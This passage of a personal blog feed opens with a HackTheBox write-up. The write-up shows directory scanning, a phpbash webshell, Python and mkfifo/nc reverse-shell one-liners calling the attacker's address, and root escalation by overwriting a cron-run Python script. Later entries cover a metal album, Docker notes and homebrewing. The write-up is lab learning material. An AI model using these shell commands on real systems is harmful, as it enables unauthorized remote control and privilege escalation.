&lt;p&gt;Since the native &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; binary didn’t support &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt;.  I just went with the bash &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkfifo&lt;/code&gt; one-liner that works when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -e&lt;/code&gt; isn’t available.&lt;/p&gt;

&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.py&lt;/code&gt; I added the code via an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt; command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import os; os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.2 4445 &amp;gt;/tmp/f')&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; test.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I had my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lvnp 4445&lt;/code&gt; listener up and it received a shell.  Got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; without issue.&lt;/p&gt;

&lt;h3 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h3&gt;

&lt;p&gt;Overall a pretty fun and straightforward box.  My first writeup as a means of keeping notes.  If it is helpful to others, that is great!&lt;/p&gt;

&lt;p&gt;In the future, I’m hoping to get better with screenshots etc. or learning how to capture the commands and output in gifs.  We will see.&lt;/p&gt;

&lt;p&gt;As mentioned this was pretty straight forward.  I learned not to overcomplicate python code when you have an available escalation path via a root cronjob.&lt;/p&gt;</content><author><name>wittr</name></author><category term="writeups" /><summary type="html">Summary This was a box that mainly involved scanning the web server for interesting items and then gaining foothold via a php webshell called phpbash. Privilege escalation was a good exercise in not overcomplicating python code. Walkthrough Enumeration Started with the usual nmap scan of nmap -T4 -A -v 10.10.10.68. Only thing found was a webserver so I looked at the webserver. I decided to run dirb as I have used gobuster before but not dirb so it ws a chance to get familiar with the tool. It seems to have its default wordlisting for directories and that worked here. dirb http:///10.10.10.68 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Tue Jul 7 22:41:29 2020 URL_BASE: http:///10.10.10.68/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http:///10.10.10.68/ ---- + http:///10.10.10.68/css (CODE:301|SIZE:308) + http:///10.10.10.68/dev (CODE:301SIZE:308) + http:///10.10.10.68/fonts (CODE:301|SIZE:310) + http:///10.10.10.68/images (CODE:301|SIZE:311) + http:///10.10.10.68/index.html (CODE:200|SIZE:7743) + http:///10.10.10.68/js (CODE:301|SIZE:307) + http:///10.10.10.68/php (CODE:301|SIZE:308) + http:///10.10.10.68/server-status (CODE:403|SIZE:299) + http:///10.10.10.68/uploads (CODE:301|SIZE:312) ----------------- END_TIME: Tue Jul 7 22:45:06 2020 DOWNLOADED: 4612 - FOUND: 9 The noticable thing here that leads to something is /dev. Browsing to it shows us that phpbash is indeed available for use. So browsing to http://10.10.10.68/dev/phpbash.php gave me a webshell. Foothold I had issues trying to figure out how to use phpbash to get a reverse shell. The usual nc command wasn’t working, and the usual mkfifo one-liner workaround didn’t work inside the webshell. Also noticed perl and a few others weren’t available as well. For me only a python reverse shell one-liner worked: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;IP&amp;gt;&quot;,&amp;lt;port&amp;gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' After getting a shell, I upgraded it with the standard python command: python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' Immediately after doing this I was getting an echo of each character lliikkee tthhiiss So I did a CTRL+Z to the background and ran stty raw -echo followed by fg to get my shell back, and the echo was gone. User I immediately went to /home and noticed that arrexel’s user folder had world readable permissions on the user.txt file. I was able to cat it easily as the www-data user. Root Looking around the filesystem (and a peek at the official HTB walkthrough cause honestly, I have to be effective with my time at this point in my life) we see the /scripts root directory is owned by the scriptmanager user. Checking out sudo -l options we see that we can run anything as this scriptmanager user so I grab a shell as the user via this command: sudo -u scriptmanager /bin/bash Moving into the interesting /scripts directory we see a couple files: test.py and test.txt. The test.txt file seems to update its timestamp every minute or so and is owned by root. Looking at the contents of the test.py we can see why - it is simply putting text into the txt file when it executes. root must be executing it since it is the owner of the test.txt file. Now that I had write access to the test.py file, I just needed to write some python code to give me a reverse shell. I did some Googling and discovered this is as easy as just using native python os lib. Since the native nc binary didn’t support -e. I just went with the bash mkfifo one-liner that works when nc -e isn’t available. In test.py I added the code via an echo command: echo &quot;import os; os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.2 4445 &amp;gt;/tmp/f')&quot; &amp;gt; test.py I had my nc -lvnp 4445 listener up and it received a shell. Got /root/root.txt without issue. Lessons Learned Overall a pretty fun and straightforward box. My first writeup as a means of keeping notes. If it is helpful to others, that is great! In the future, I’m hoping to get better with screenshots etc. or learning how to capture the commands and output in gifs. We will see. As mentioned this was pretty straight forward. I learned not to overcomplicate python code when you have an available escalation path via a root cronjob.</summary></entry><entry><title type="html">Esoctrilihum</title><link href="/music/2020/07/06/Esoctrilihum.html" rel="alternate" type="text/html" title="Esoctrilihum" /><published>2020-07-06T23:36:00-05:00</published><updated>2020-07-06T23:36:00-05:00</updated><id>/music/2020/07/06/Esoctrilihum</id><content type="html" xml:base="/music/2020/07/06/Esoctrilihum.html">&lt;p&gt;I came across what is potentially the best album of this year.&lt;/p&gt;

&lt;p&gt;I’m talking about &lt;em&gt;Esoctrilihum - Eternity of Shaog.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I’ve heard many bands that are part of the “blacked death” genre.  This
album is closer to “deathened black”™ (jk) metal.  Every track seems to be unique.&lt;/p&gt;

&lt;p&gt;I can’t stop listening to it.&lt;/p&gt;

&lt;p&gt;I plan to do some hackthebox writeups in the near future with a plan to focus different
writeups on tools as I learn some of their useful commands etc.&lt;/p&gt;

&lt;p&gt;Here’s to hoping I stick with it this time.  Patience is a virtue.&lt;/p&gt;

&lt;p&gt;Esoctrilihum - Eternity of Shaog&lt;/p&gt;
&lt;div style=&quot;position: relative; margin: 1.5em 0;&quot;&gt;
  &lt;iframe style=&quot;border: 0; width: 450px; height: 890px;&quot; src=&quot;https://bandcamp.com/EmbeddedPlayer/album=532180629/size=large/bgcol=ffffff/linkcol=0687f5/transparent=true/&quot; seamless=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/div&gt;</content><author><name>wittr</name></author><category term="music" /><summary type="html">I came across what is potentially the best album of this year. I’m talking about Esoctrilihum - Eternity of Shaog. I’ve heard many bands that are part of the “blacked death” genre. This album is closer to “deathened black”™ (jk) metal. Every track seems to be unique. I can’t stop listening to it. I plan to do some hackthebox writeups in the near future with a plan to focus different writeups on tools as I learn some of their useful commands etc. Here’s to hoping I stick with it this time. Patience is a virtue. Esoctrilihum - Eternity of Shaog</summary></entry><entry><title type="html">Begin (Yet) Again</title><link href="/personal/2020/07/05/begin-again.html" rel="alternate" type="text/html" title="Begin (Yet) Again" /><published>2020-07-05T23:00:00-05:00</published><updated>2020-07-05T23:00:00-05:00</updated><id>/personal/2020/07/05/begin-again</id><content type="html" xml:base="/personal/2020/07/05/begin-again.html">&lt;p&gt;I recently subscribed to &lt;a href=&quot;https://hackthebox.eu&quot;&gt;HackTheBox.eu&lt;/a&gt; and I’ve been enjoying it a lot.&lt;/p&gt;

&lt;p&gt;I decided to fire back up the blog.. this time with jekyll as means of organizing 
my notes when doing writeups for the different boxes.  Pelican just didn’t seem as supported anymore.
Also I don’t have a ton of ruby experience so it’ll help with that.&lt;/p&gt;

&lt;p&gt;I really need to work on my whole setup of my laptop.  I’m using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vi&lt;/code&gt; for this which is fine, but I 
just asked myself why the hell I’m not using vscode for markdown.&lt;/p&gt;

&lt;p&gt;This time I’ll probably write more on different metal too, just for keeping notes on great albums
and why i liked them in the first place.  Everyones got a blog, why not me too?&lt;/p&gt;

&lt;p&gt;To be continued!&lt;/p&gt;</content><author><name>wittr</name></author><category term="personal" /><summary type="html">I recently subscribed to HackTheBox.eu and I’ve been enjoying it a lot. I decided to fire back up the blog.. this time with jekyll as means of organizing my notes when doing writeups for the different boxes. Pelican just didn’t seem as supported anymore. Also I don’t have a ton of ruby experience so it’ll help with that. I really need to work on my whole setup of my laptop. I’m using vi for this which is fine, but I just asked myself why the hell I’m not using vscode for markdown. This time I’ll probably write more on different metal too, just for keeping notes on great albums and why i liked them in the first place. Everyones got a blog, why not me too? To be continued!</summary></entry><entry><title type="html">Docker it up</title><link href="/tools/music/2017/09/14/Docker.html" rel="alternate" type="text/html" title="Docker it up" /><published>2017-09-14T23:00:00-05:00</published><updated>2017-09-14T23:00:00-05:00</updated><id>/tools/music/2017/09/14/Docker</id><content type="html" xml:base="/tools/music/2017/09/14/Docker.html">&lt;h1 id=&quot;docker-notes&quot;&gt;Docker Notes&lt;/h1&gt;
&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.docker.com/get-started/&quot;&gt;Get Started&lt;/a&gt;&lt;br /&gt;
I spent a couple days going over the basics of Docker.. just wanted to summarize what I’ve learned.  I should probably just invest my time in EverNote instead of typing up these markdown pages.  But honestly, challenge accepted.&lt;/p&gt;

&lt;h2 id=&quot;terms&quot;&gt;Terms&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Image&lt;/strong&gt; - A read-only package that is housed within a container&lt;br /&gt;
&lt;strong&gt;Container&lt;/strong&gt; - This is a runtime of images defined by a &lt;em&gt;Dockerfile&lt;/em&gt;. I don’t know what all goes in this yet but it seems to define what directories exist and what ports to open up from the container to the host.  More TBD.&lt;br /&gt;
&lt;strong&gt;Service&lt;/strong&gt; - Scaling and load balancing.  This is where you define what service a container will function as (ie. web) and define parameters like how many container replicas.&lt;br /&gt;
&lt;strong&gt;Replica&lt;/strong&gt; - Basically a container instance on a single host machine running docker engine.&lt;br /&gt;
&lt;strong&gt;Swarm&lt;/strong&gt; - When you begin clustering multiple docker hosts (with their own docker engines running) then these are called swarms.  Apps can quickly be deployed to swarms configured to talk to each other. &lt;br /&gt;
&lt;strong&gt;Node&lt;/strong&gt; - A single docker host in a swarm.&lt;br /&gt;
&lt;strong&gt;Stack&lt;/strong&gt; - The docker compose basically defines this.  It can consist of different services that deploy containers (ie. web, db, etc.)&lt;/p&gt;

&lt;p&gt;Note to self - learn YAML.&lt;/p&gt;

&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;/h2&gt;
&lt;h3 id=&quot;general&quot;&gt;General&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker container ls&lt;/code&gt; - list containers on a host&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker service ls&lt;/code&gt; - list services on a host&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker service ps &amp;lt;service&amp;gt;&lt;/code&gt; - show tasks spawned by a service (services run tasks, tasks then spawn containers)&lt;/p&gt;

&lt;h3 id=&quot;swarm-manager&quot;&gt;Swarm Manager&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker node ls&lt;/code&gt; - list nodes in a swarm (swarm manager command)&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker stack deploy -c &amp;lt;yaml file&amp;gt; &amp;lt;name&amp;gt;&lt;/code&gt; - Deploy an app to a swarm&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker stack rm &amp;lt;name&amp;gt;&lt;/code&gt; - Undeploy an app from a swarm&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker swarm init&lt;/code&gt; - initialize a swarm manager&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker swarm join --token &amp;lt;blah&amp;gt; ...&lt;/code&gt; - look for this command when performing a swarm init to join nodes to the swarm&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker swarm leave (--force)&lt;/code&gt; - have a node leave a swarm&lt;/p&gt;

&lt;h2 id=&quot;other-observations&quot;&gt;Other observations&lt;/h2&gt;
&lt;h3 id=&quot;docker-machine&quot;&gt;Docker machine&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Used for managing docker engine node machines&lt;/li&gt;
  &lt;li&gt;Controls local virtual machines and can utilize virtualbox/hyperv/etc.&lt;/li&gt;
  &lt;li&gt;Seems like local virtual machines with multiple docker container could potentially be a good localized development environment?&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;docker-compose-files&quot;&gt;Docker compose files&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;docker-compose is needed (I believe) for compose YAML files to work&lt;/li&gt;
  &lt;li&gt;replicas define the number of containers for a given service on a swarm.  This means “5” could be 2 on one node, 3 on another in a 2 node swarm.&lt;/li&gt;
  &lt;li&gt;overlay networks seem to be distributed networks, or like distributed switches in vmware.  &lt;em&gt;More TBD here.&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;ports define how to map container ports for a service to the actual host ports that can be connected to&lt;/li&gt;
  &lt;li&gt;volumes are used to define common “source of truth” directories for persisting data. &lt;em&gt;More TBD here.&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;placement constraints can limit where a particular service is deployed (ie. only node1, not node2, this or that.. blah blah)&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h3 id=&quot;music&quot;&gt;Music&lt;/h3&gt;
&lt;p&gt;Per usual, spinning music is constant for me.&lt;br /&gt;
I’ve always been a pretty big fan of Neurosis.  This is Steve Von Till’s personal project, and I highly recommend zoning out to it (especially &lt;em&gt;White Horse&lt;/em&gt;).&lt;/p&gt;

&lt;div style=&quot;position: relative; margin: 1.5em 0;&quot;&gt;
  &lt;iframe style=&quot;border: 0; width: 350px; height: 687px;&quot; src=&quot;https://bandcamp.com/EmbeddedPlayer/album=213854351/size=large/bgcol=ffffff/linkcol=0687f5/transparent=true/&quot; seamless=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/div&gt;

&lt;h3 id=&quot;white-horse&quot;&gt;White Horse&lt;/h3&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The stones call to me, just as they always have.
A gateway to the mysteries, and a pathway to the ancestors.
Place my hands in the ashes, dream inside the earth.
Feel the pulse, the magnetic pull between me and the stone.
Witness the daystar rising, as Earth's fire rises, 
up through the spine, filling the heart, 
exploding the mind, and erupting from the crown of my skull.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>wittr</name></author><category term="tools" /><category term="music" /><summary type="html">Docker Notes Reference Get Started I spent a couple days going over the basics of Docker.. just wanted to summarize what I’ve learned. I should probably just invest my time in EverNote instead of typing up these markdown pages. But honestly, challenge accepted. Terms Image - A read-only package that is housed within a container Container - This is a runtime of images defined by a Dockerfile. I don’t know what all goes in this yet but it seems to define what directories exist and what ports to open up from the container to the host. More TBD. Service - Scaling and load balancing. This is where you define what service a container will function as (ie. web) and define parameters like how many container replicas. Replica - Basically a container instance on a single host machine running docker engine. Swarm - When you begin clustering multiple docker hosts (with their own docker engines running) then these are called swarms. Apps can quickly be deployed to swarms configured to talk to each other. Node - A single docker host in a swarm. Stack - The docker compose basically defines this. It can consist of different services that deploy containers (ie. web, db, etc.) Note to self - learn YAML. Commands General docker container ls - list containers on a host docker service ls - list services on a host docker service ps &amp;lt;service&amp;gt; - show tasks spawned by a service (services run tasks, tasks then spawn containers) Swarm Manager docker node ls - list nodes in a swarm (swarm manager command) docker stack deploy -c &amp;lt;yaml file&amp;gt; &amp;lt;name&amp;gt; - Deploy an app to a swarm docker stack rm &amp;lt;name&amp;gt; - Undeploy an app from a swarm docker swarm init - initialize a swarm manager docker swarm join --token &amp;lt;blah&amp;gt; ... - look for this command when performing a swarm init to join nodes to the swarm docker swarm leave (--force) - have a node leave a swarm Other observations Docker machine Used for managing docker engine node machines Controls local virtual machines and can utilize virtualbox/hyperv/etc. Seems like local virtual machines with multiple docker container could potentially be a good localized development environment? Docker compose files docker-compose is needed (I believe) for compose YAML files to work replicas define the number of containers for a given service on a swarm. This means “5” could be 2 on one node, 3 on another in a 2 node swarm. overlay networks seem to be distributed networks, or like distributed switches in vmware. More TBD here. ports define how to map container ports for a service to the actual host ports that can be connected to volumes are used to define common “source of truth” directories for persisting data. More TBD here. placement constraints can limit where a particular service is deployed (ie. only node1, not node2, this or that.. blah blah) Music Per usual, spinning music is constant for me. I’ve always been a pretty big fan of Neurosis. This is Steve Von Till’s personal project, and I highly recommend zoning out to it (especially White Horse). White Horse The stones call to me, just as they always have. A gateway to the mysteries, and a pathway to the ancestors. Place my hands in the ashes, dream inside the earth. Feel the pulse, the magnetic pull between me and the stone. Witness the daystar rising, as Earth's fire rises, up through the spine, filling the heart, exploding the mind, and erupting from the crown of my skull.</summary></entry><entry><title type="html">Brewing 101</title><link href="/beer/2017/08/30/beer101.html" rel="alternate" type="text/html" title="Brewing 101" /><published>2017-08-30T20:30:00-05:00</published><updated>2017-08-30T20:30:00-05:00</updated><id>/beer/2017/08/30/beer101</id><content type="html" xml:base="/beer/2017/08/30/beer101.html">&lt;h3 id=&quot;rip-apple-mbp&quot;&gt;RIP Apple MBP&lt;/h3&gt;
&lt;p&gt;Just wanted to hold a moment of silence in this post for my 2011 Macbook Pro that officially died this morning. /sadface&lt;/p&gt;

&lt;p&gt;After a lot of troubleshooting I narrowed it down to the keyboard’s power button and ended up &lt;a href=&quot;https://www.ifixit.com/Guide/MacBook+Pro+17-Inch+Unibody+Upper+Case+Replacement/3439&quot;&gt;ripping it all open&lt;/a&gt; and &lt;a href=&quot;http://www.insidemylaptop.com/how-to-replace-keyboard-on-macbook-pro-13-15-17-laptops/&quot;&gt;replacing the keyboard&lt;/a&gt;.  The power button did work after that and I felt a moment of accomplishment.  It continued to work up until I had to plug in the power cord to charge it.  Overnight it charged while in “hibernation” due to being idle.  Next day - nothing from the power button.  Going through all the troubleshooting - no dice.  Therefore, I’m going to conclude that there was a short going on somewhere that bricked the board when I hooked up the power and I’m moving on.  I’ve still got my Samsung ultrabook to keep me company.&lt;/p&gt;

&lt;p&gt;Well - onto the brewing notes! I recently attended a brewing 101 session.  I brewed for maybe 2 years off and on but never really tried to greatly improve. This time will hopefully be different.  Key notes from the session below.&lt;/p&gt;

&lt;h1 id=&quot;brew-101-notes&quot;&gt;Brew 101 Notes&lt;/h1&gt;
&lt;h2 id=&quot;general&quot;&gt;General&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Mark 5 gallons on fermenter for ease of use&lt;/li&gt;
  &lt;li&gt;Do not use distilled water - no minerals&lt;/li&gt;
  &lt;li&gt;Even temperatures during fermentation help yeast prevent off flavors&lt;/li&gt;
  &lt;li&gt;Certain kinds of beer - higher fermentation temps help flavor (ie. bavarian hefeweizen and banana clove flavor)&lt;/li&gt;
  &lt;li&gt;Think about a bag over a fermenter in case of eruption&lt;/li&gt;
  &lt;li&gt;Avoid aluminum pots because they heat too quickly&lt;/li&gt;
  &lt;li&gt;Don’t add nuts or anything with high fat to beer&lt;/li&gt;
  &lt;li&gt;White Vinegar can clean a copper wort chiller&lt;/li&gt;
  &lt;li&gt;OG - if lower than expected - expect to drink beer faster.  If above, can dilute the wort before fermentation with extra water.&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Type&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Hops Flavor&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Grain Flavor&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;American&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Piney&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Dry&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;British&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Herbal/Earthy&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Bread-y&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;German&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mix of above&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mix of above&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Belgian/French&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Pepper/Flower-y&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Biscuit&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;New Zealand/Australia&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Tropical Fruit&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;——&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;procedure&quot;&gt;Procedure&lt;/h2&gt;
&lt;h3 id=&quot;prep&quot;&gt;Prep&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Everything should be “Visibility” clean&lt;/li&gt;
  &lt;li&gt;Cleanliness is the most important thing to brewing good beer&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;CLEAN&lt;/em&gt; - PBW is your friend&lt;br /&gt;
  ** Fermenter - 30 min soak&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;SANITIZE&lt;/em&gt; - StarSan is your friend&lt;br /&gt;
  ** Fermenter - 30 second shake&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;brew-day&quot;&gt;Brew day&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Only use cold water&lt;/li&gt;
  &lt;li&gt;Grains into water before bringing to boil - 170 degrees max / ~20 minutes&lt;/li&gt;
  &lt;li&gt;Cut heat when adding extract or malt&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Don’t&lt;/em&gt; squeeze the grains when removing from the kettle, just let it drip&lt;/li&gt;
  &lt;li&gt;No need to stir hops&lt;/li&gt;
  &lt;li&gt;Avoid boil over by removing heat, don’t blow on foam&lt;/li&gt;
  &lt;li&gt;Do not put a lid on the boil, causes off flavors&lt;/li&gt;
  &lt;li&gt;Clarifiers are awesome, but not for all beers (ie. hefeweizen)&lt;/li&gt;
  &lt;li&gt;Wort chiller could be added into boil near the end (5min) to sanitize, but better idea to just sanitize in solution&lt;/li&gt;
  &lt;li&gt;Add &lt;em&gt;chilled&lt;/em&gt; water to wort after boil to bring to fermenter.  Fill to 5.25-5.5 gallons.&lt;/li&gt;
  &lt;li&gt;Be sure to stir wort prior to OG reading after adding chilled water. Taste it and remember it for comparison post-fermination.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;fermenting&quot;&gt;Fermenting&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;The sooner the fermentation begins the better.  Hopefully 12-24 hours.&lt;/li&gt;
  &lt;li&gt;If nothing happens after 36+ hours - pitch new yeast&lt;/li&gt;
  &lt;li&gt;If there isn’t much action, check temp of the fermenter.  Should be in the mid-high end for the yeast strain ideally.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;secondary&quot;&gt;Secondary&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;After OG remains consistent for 2-3 days in a row, transfer.&lt;/li&gt;
  &lt;li&gt;Secondary is absolutely necessary for beers with OG &amp;gt; 1.05&lt;/li&gt;
  &lt;li&gt;Used to smooth out taste or add other flavors (like a dry hop)&lt;/li&gt;
  &lt;li&gt;Try not to disturb the cake of the primary fermenter when transferring&lt;/li&gt;
  &lt;li&gt;Dry hopping - can be done at any time during the secondary timeframe (~2 weeks)&lt;/li&gt;
  &lt;li&gt;OG measurement - taste should be approx 75% less sweet than the original OG measurement (wort)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;bottling&quot;&gt;Bottling&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Use corn sugar, it’s the best for bottle conditioning&lt;/li&gt;
  &lt;li&gt;Dried malt extract (DME) could be used for more bubbles, but takes longer to condition (3+ weeks)&lt;/li&gt;
  &lt;li&gt;Stir the boiled sugar into bottling bucket for thorough mixture, gently.&lt;/li&gt;
  &lt;li&gt;Turn the bottle to its side after capping to ensure proper seal&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;amount-of-corn-sugar-per-5gal-batch&quot;&gt;Amount of corn sugar per 5gal batch&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;4.5 oz - Bar type carbonation&lt;/li&gt;
  &lt;li&gt;4 oz - better for English beers&lt;/li&gt;
  &lt;li&gt;4.75 oz - Belgians&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;enjoyment&quot;&gt;Enjoyment&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;2-3 weeks to condition, max 3&lt;/li&gt;
  &lt;li&gt;If OG 1.030 –&amp;gt; Drink within 2 months&lt;/li&gt;
  &lt;li&gt;If OG is higher –&amp;gt; Drink within 6 months&lt;/li&gt;
&lt;/ul&gt;</content><author><name>wittr</name></author><category term="beer" /><summary type="html">RIP Apple MBP Just wanted to hold a moment of silence in this post for my 2011 Macbook Pro that officially died this morning. /sadface After a lot of troubleshooting I narrowed it down to the keyboard’s power button and ended up ripping it all open and replacing the keyboard. The power button did work after that and I felt a moment of accomplishment. It continued to work up until I had to plug in the power cord to charge it. Overnight it charged while in “hibernation” due to being idle. Next day - nothing from the power button. Going through all the troubleshooting - no dice. Therefore, I’m going to conclude that there was a short going on somewhere that bricked the board when I hooked up the power and I’m moving on. I’ve still got my Samsung ultrabook to keep me company. Well - onto the brewing notes! I recently attended a brewing 101 session. I brewed for maybe 2 years off and on but never really tried to greatly improve. This time will hopefully be different. Key notes from the session below. Brew 101 Notes General Mark 5 gallons on fermenter for ease of use Do not use distilled water - no minerals Even temperatures during fermentation help yeast prevent off flavors Certain kinds of beer - higher fermentation temps help flavor (ie. bavarian hefeweizen and banana clove flavor) Think about a bag over a fermenter in case of eruption Avoid aluminum pots because they heat too quickly Don’t add nuts or anything with high fat to beer White Vinegar can clean a copper wort chiller OG - if lower than expected - expect to drink beer faster. If above, can dilute the wort before fermentation with extra water. Type Hops Flavor Grain Flavor American Piney Dry British Herbal/Earthy Bread-y German Mix of above Mix of above Belgian/French Pepper/Flower-y Biscuit New Zealand/Australia Tropical Fruit —— Procedure Prep Everything should be “Visibility” clean Cleanliness is the most important thing to brewing good beer CLEAN - PBW is your friend ** Fermenter - 30 min soak SANITIZE - StarSan is your friend ** Fermenter - 30 second shake Brew day Only use cold water Grains into water before bringing to boil - 170 degrees max / ~20 minutes Cut heat when adding extract or malt Don’t squeeze the grains when removing from the kettle, just let it drip No need to stir hops Avoid boil over by removing heat, don’t blow on foam Do not put a lid on the boil, causes off flavors Clarifiers are awesome, but not for all beers (ie. hefeweizen) Wort chiller could be added into boil near the end (5min) to sanitize, but better idea to just sanitize in solution Add chilled water to wort after boil to bring to fermenter. Fill to 5.25-5.5 gallons. Be sure to stir wort prior to OG reading after adding chilled water. Taste it and remember it for comparison post-fermination. Fermenting The sooner the fermentation begins the better. Hopefully 12-24 hours. If nothing happens after 36+ hours - pitch new yeast If there isn’t much action, check temp of the fermenter. Should be in the mid-high end for the yeast strain ideally. Secondary After OG remains consistent for 2-3 days in a row, transfer. Secondary is absolutely necessary for beers with OG &amp;gt; 1.05 Used to smooth out taste or add other flavors (like a dry hop) Try not to disturb the cake of the primary fermenter when transferring Dry hopping - can be done at any time during the secondary timeframe (~2 weeks) OG measurement - taste should be approx 75% less sweet than the original OG measurement (wort) Bottling Use corn sugar, it’s the best for bottle conditioning Dried malt extract (DME) could be used for more bubbles, but takes longer to condition (3+ weeks) Stir the boiled sugar into bottling bucket for thorough mixture, gently. Turn the bottle to its side after capping to ensure proper seal Amount of corn sugar per 5gal batch 4.5 oz - Bar type carbonation 4 oz - better for English beers 4.75 oz - Belgians Enjoyment 2-3 weeks to condition, max 3 If OG 1.030 –&amp;gt; Drink within 2 months If OG is higher –&amp;gt; Drink within 6 months</summary></entry><entry><title type="html">Becoming a Metaphysician</title><link href="/music/2017/08/16/becoming-a-metaphysician.html" 